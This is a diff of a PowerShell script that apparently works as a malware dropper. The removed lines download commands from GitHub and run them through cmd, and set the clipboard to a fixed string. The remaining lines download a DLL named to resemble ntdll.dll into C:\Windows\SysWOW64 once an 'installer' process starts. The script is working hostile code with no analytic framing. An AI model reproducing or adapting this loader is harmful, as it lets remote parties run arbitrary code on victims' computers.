@@ -1,9 +1,6 @@
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
-$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
 $urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
-$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
-$clipText = "SteF6b2WrAgu"
 
 function HexToBytes {
     param([string]$hexStr)
@@ -35,22 +32,6 @@ try {
     exit 1
 }
 
-Set-Clipboard $clipText
-
-try {
-    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing
-    if ($responseB.StatusCode -eq 200) {
-        $cmdToRun = $responseB.Content.Trim()
-        if ($cmdToRun) {
-            Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
-        }
-    }
-} catch {
-    exit 1
-}
-
-Start-Sleep -Seconds 3
-
 do {
     Start-Sleep -Milliseconds 500
 } while (-not (Get-Process -Name "installer" -ErrorAction SilentlyContinue))
@@ -61,18 +42,6 @@ do {
 
 try {
     Invoke-WebRequest -Uri $urlC -OutFile $filePath -UseBasicParsing
-} catch {
-    exit 1
-}
-
-try {
-    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing
-    if ($responseD.StatusCode -eq 200) {
-        $finalCmd = $responseD.Content.Trim()
-        if ($finalCmd) {
-            Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
-        }
-    }
 } catch {
     exit 1
 }
